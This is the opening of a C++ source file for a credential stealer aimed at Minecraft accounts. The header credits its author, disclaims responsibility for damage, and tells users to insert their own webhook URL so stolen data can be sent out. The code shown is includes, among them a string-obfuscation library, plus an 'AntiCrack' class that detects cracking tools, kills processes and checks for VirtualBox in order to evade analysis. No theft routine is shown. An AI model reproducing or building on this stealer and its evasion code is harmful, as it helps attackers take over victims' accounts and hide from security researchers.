/*

//===================================================//

this stealer was coded by itosted / juvee <--- https://github.com/zjuvee
you can use this code, but i dont take any responsibility for any damage caused.

remember to change the webhook url in the includes/MinecraftStealer.hpp file

pd: give me credits if you use this code in your project. <---- please, dont copy pasted and remove the name

//===================================================//
*/

#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <string>
#include <filesystem>
#include <chrono>
#include <thread>
#include <locale>
#include <codecvt>
#include <iostream>
#include <filesystem>
#include <windows.h>
#include <Lmcons.h>
#include <fstream>
#include <string>
#include "xorstr.hpp"

class AntiCrack {
public:
	static bool isProcessRunning(const std::wstring& processName);
	static void closeProcess(const std::wstring& processName);
	static void checkForCrackingToolsA();
	static bool isRunningInVirtualBox();
};